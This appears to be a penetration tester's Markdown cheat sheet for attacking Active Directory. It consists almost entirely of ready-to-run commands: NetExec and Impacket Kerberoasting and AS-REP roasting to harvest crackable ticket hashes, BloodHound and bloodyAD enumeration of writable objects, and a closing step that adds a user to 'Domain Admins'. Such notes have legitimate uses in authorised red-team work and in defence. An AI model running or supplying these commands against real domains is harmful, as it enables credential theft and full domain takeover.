# Active Directory Enumeration

## Intial Domain Enum

### Initialize env vars
```bash
export dcip=<DCIP>
export domain=<DOMAIN>
export domainuser=<DOMAINUSER>
export domainuserpwd=<DOMAINUSERPASSWORD>
```

### Get all users and groups
```bash
nxc ldap $dcip -d $domain -u $domainuser -p $domainuserpwd --groups | grep "membercount:" | awk -F'  +' '{print $5}' > groups
nxc ldap $dcip -d $domain -u $domainuser -p $domainuserpwd --user-export users
```
### Spray kerberoasting and asreproasting.
```bash
nxc ldap $dcip -d $domain -u $domainuser -p "$domainuserpwd" --kerberoasting nxckerb
python3 GetUserSPNs.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -request -outputfile impkerb

nxc ldap $dcip -d $domain -u $domainuser -p "$domainuserpwd" --asreproast nxcasrep
python GetNPUsers.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -request -outputfile impasrep
```

### Bloodhound
```bash
cd ~/bloodhound
./bloodhound-cli up
./bloodhound-cli resetpwd
```

## Targeted Enum

### Get pwned user outbound object control
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get writable --otype USER --detail
```

### Enum group membership
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get membership john.doe
```

### Get object details
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get object "Domain Admins"
```
## AD Exploitation

### Add user to group
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" add groupMember "Domain Admins" "john.doe"
python3 net.py "$domain/$domainuser:$domainuserpwd@$dcip" group -name "Domain Admins" -add "john.doe"
```
